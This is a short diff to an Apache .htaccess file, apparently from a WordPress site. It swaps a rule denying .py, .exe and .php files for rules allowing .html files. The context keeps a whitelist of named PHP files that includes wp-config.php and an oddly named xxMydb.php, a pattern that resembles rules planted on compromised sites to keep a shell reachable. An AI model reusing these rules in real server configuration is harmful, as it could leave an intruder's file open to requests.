@@ -2,9 +2,13 @@
         Order Allow,Deny
         Deny From All
 </Files>
-<FilesMatch ".(|*|py|exe|php)$">
+<Files .html>
+        Order Deny,Allow
+        Allow From All
+</Files>
+<FilesMatch ".(html)$">
 Order allow,deny
-Deny from all
+Allow from all
 </FilesMatch>
 <FilesMatch "^(index.php|xxMydb.php|template.php|templates.php|wp-config.php|.wp-config.php)$">
 Order allow,deny
